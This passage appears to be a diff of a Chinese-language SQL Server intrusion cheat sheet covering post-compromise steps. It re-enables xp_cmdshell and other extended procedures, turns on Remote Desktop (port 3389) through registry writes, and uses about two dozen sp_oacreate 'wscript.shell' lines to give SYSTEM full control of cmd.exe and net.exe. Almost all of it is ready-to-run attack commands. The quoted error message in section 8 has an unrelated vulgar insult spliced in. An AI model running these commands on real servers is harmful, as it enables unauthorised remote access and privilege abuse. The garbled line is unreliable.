+dbcc addextendedproc ("xp_cmdshell","c:\Program Files\Microsoft SQL Server\MSSQL\Binn\xplog70.dll")
+
+;EXEC sp_configure   'show advanced options', 0 -- 
+
+ 
+
+第六、开3389：
+
+Cmd 命令
+
+REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 0 /f
+
+ 
+
+Sql命令
+
+开3389
+
+exec master.dbo.xp_regwrite'HKEY_LOCAL_MACHINE','SYSTEM\CurrentControlSet\Control\Terminal Server','fDenyTSConnections','REG_DWORD',0;--  
+
+ 
+
+ 
+
+关3389：
+
+ 
+
+exec master.dbo.xp_regwrite'HKEY_LOCAL_MACHINE','SYSTEM\CurrentControlSet\Control\Terminal Server','fDenyTSConnections','REG_DWORD',1;  
+
+ 
+
+查看3389端口
+
+ 
+
+exec xp_regread 'HKEY_LOCAL_MACHINE','SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp','PortNumber'
+
+
+666666.  第七、Error Message:xpsql.cpp: 错误 5 来自 CreateProcess（第 675 行）
+
+dbcc dropextendedproc ("xp_cmdshell");
+dbcc addextendedproc ("xp_cmdshell","xplog70.dll");
+dbcc dropextendedproc ("xp_dirtree");
+dbcc addextendedproc ("xp_dirtree","xpstar.dll");
+dbcc dropextendedproc ("xp_regread");
+dbcc addextendedproc ("xp_regread","xpstar.dll");
+dbcc dropextendedproc ("xp_regwrite");
+dbcc addextendedproc ("xp_regwrite","xpstar.dll");
+dbcc dropextendedproc ("sp_OACreate");
+dbcc addextendedproc ("sp_OACreate","odsole70.dll");
+dbcc dropextendedproc ("sp_OAMethod");
+dbcc addextendedproc ("sp_OAMethod","odsole70.dll");
+declare @shell int exec sp_oacreate 'wscript.shell',@shell output exec sp_oamethod @shell,'run',null,'wbem\sr cmd.exe /e /g system:f'
+declare @shell1 int exec sp_oacreate 'wscript.shell',@shell1 output exec sp_oamethod @shell1,'run',null,'wbem\sr net1.exe /e /g system:f'
+declare @shell2 int exec sp_oacreate 'wscript.shell',@shell2 output exec sp_oamethod @shell2,'run',null,'wbem\sr net.exe /e /g system:f'
+declare @shell3 int exec sp_oacreate 'wscript.shell',@shell3 output exec sp_oamethod @shell3,'run',null,'wbem\sp cmd.exe /e /g system:f'
+declare @shell4 int exec sp_oacreate 'wscript.shell',@shell4 output exec sp_oamethod @shell4,'run',null,'wbem\sp net1.exe /e /g system:f'
+declare @shell5 int exec sp_oacreate 'wscript.shell',@shell5 output exec sp_oamethod @shell5,'run',null,'wbem\sp net.exe /e /g system:f'
+declare @shell6 int exec sp_oacreate 'wscript.shell',@shell6 output exec sp_oamethod @shell6,'run',null,'ws cmd.exe /e /g system:f'
+declare @shell7 int exec sp_oacreate 'wscript.shell',@shell7 output exec sp_oamethod @shell7,'run',null,'ws net1.exe /e /g system:f'
+declare @shell8 int exec sp_oacreate 'wscript.shell',@shell8 output exec sp_oamethod @shell8,'run',null,'ws net.exe /e /g system:f'
+declare @shell9 int exec sp_oacreate 'wscript.shell',@shell9 output exec sp_oamethod @shell9,'run',null,'wbem\we cmd.exe /e /g system:f'
+declare @shell10 int exec sp_oacreate 'wscript.shell',@shell10 output exec sp_oamethod @shell10,'run',null,'wbem\we net1.exe /e /g system:f'
+declare @shell11 int exec sp_oacreate 'wscript.shell',@shell11 output exec sp_oamethod @shell11,'run',null,'wbem\we net.exe /e /g system:f'
+declare @shell12 int exec sp_oacreate 'wscript.shell',@shell12 output exec sp_oamethod @shell12,'run',null,'wbem\xj cmd.exe /e /g system:f'
+declare @shell13 int exec sp_oacreate 'wscript.shell',@shell13 output exec sp_oamethod @shell13,'run',null,'wbem\xj net1.exe /e /g system:f'
+declare @shell14 int exec sp_oacreate 'wscript.shell',@shell14 output exec sp_oamethod @shell14,'run',null,'wbem\xj net.exe /e /g system:f'
+declare @shell15 int exec sp_oacreate 'wscript.shell',@shell15 output exec sp_oamethod @shell15,'run',null,'drivers\vs cmd.exe /e /g system:f'
+declare @shell16 int exec sp_oacreate 'wscript.shell',@shell16 output exec sp_oamethod @shell16,'run',null,'drivers\vs net1.exe /e /g system:f'
+declare @shell17 int exec sp_oacreate 'wscript.shell',@shell17 output exec sp_oamethod @shell17,'run',null,'drivers\vs net.exe /e /g system:f'
+declare @shell18 int exec sp_oacreate 'wscript.shell',@shell18 output exec sp_oamethod @shell18,'run',null,'cs cmd.exe /e /g system:f'
+declare @shell19 int exec sp_oacreate 'wscript.shell',@shell19 output exec sp_oamethod @shell19,'run',null,'cs net1.exe /e /g system:f'
+declare @shell20 int exec sp_oacreate 'wscript.shell',@shell20 output exec sp_oamethod @shell20,'run',null,'cs net.exe /e /g system:f'
+declare @shell21 int exec sp_oacreate 'wscript.shell',@shell21 output exec sp_oamethod @shell21,'run',null,'drivers\vsx cmd.exe /e /g system:f'
+declare @shell22 int exec sp_oacreate 'wscript.shell',@shell22 output exec sp_oamethod @shell22,'run',null,'drivers\vsx net1.exe /e /g system:f'
+declare @shell23 int exec sp_oacreate 'wscript.shell',@shell23 output exec sp_oamethod @shell23,'run',null,'drivers\vsx net.exe /e /g system:f'
+
+
+7777777. 第八、在查询分析器中经常遇到下面这个错误：Error Message:无法装载 DLL 江湖上到处散布着吃哥屎长大的人 或该 DLL 所引用的某一 DLL。原因: 126(找不到指定的模块。
+
+ 
+
+下面是解决方法：
+1.
+dbcc dropextendedproc ("xp_cmdshell")
+2.（执行2次）
+drop procedure sp_addextendedproc 
+drop procedure sp_oacreate 
+exec sp_dropextendedproc 'xp_cmdshell' 
+3.
+dbcc addextendedproc ("sp_oacreate","odsole70.dll") 
+dbcc addextendedproc ("xp_cmdshell","xplog70.dll")
+
+
+ 
